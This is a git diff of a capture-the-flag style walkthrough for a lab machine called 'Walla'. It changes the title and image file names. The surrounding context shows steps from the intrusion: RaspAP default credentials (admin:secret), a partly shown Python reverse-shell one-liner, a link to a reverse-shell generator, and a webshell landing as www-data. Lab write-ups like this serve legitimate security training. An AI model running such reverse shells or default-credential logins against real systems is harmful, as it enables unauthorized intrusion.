@@ -2,7 +2,7 @@
 description: 12/05/2022
 ---
 
-# Walla
+# Walla (Intermediate)
 
 ## Information Gathering
 
@@ -80,9 +80,9 @@ Notes:
 
 Visual:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>admin:secret (Default Credentials)</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>admin:secret (Default Credentials)</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Discovering Default Credentials</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Discovering Default Credentials</p></figcaption></figure>
 
 * We now have access to the RaspAP login page!
 
@@ -112,7 +112,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 {% embed url="https://www.revshells.com/" %}
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>RaspAP Webshell</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (9).png" alt=""><figcaption><p>RaspAP Webshell</p></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Landed as www-data</p></figcaption></figure>
 
